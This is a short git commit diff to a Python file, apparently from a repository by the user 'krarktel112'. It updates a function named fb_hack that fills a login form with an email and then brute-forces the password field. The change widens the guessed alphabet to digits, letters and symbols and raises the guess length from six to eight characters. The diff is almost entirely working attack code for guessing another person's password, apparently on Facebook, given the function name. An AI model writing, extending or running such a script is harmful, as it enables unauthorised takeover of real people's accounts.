34661db4f10fe59fdd7ca961b640663e3d3d0e4f
krarktel112 <krarktel@gmail.com>
2024-10-03 14:48:43 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -56,7 +56,7 @@ def fb_hack(email, codex):
   browser.form['email'] = email
   browser.submit()
   counter = 0
-  for combination in itertools.product(["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
+  for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z","!","#","$","%","^","&","*"], repeat=8):
     try:
       p = (''.join(map(str, combination)))
       browser.form['pass'] = p
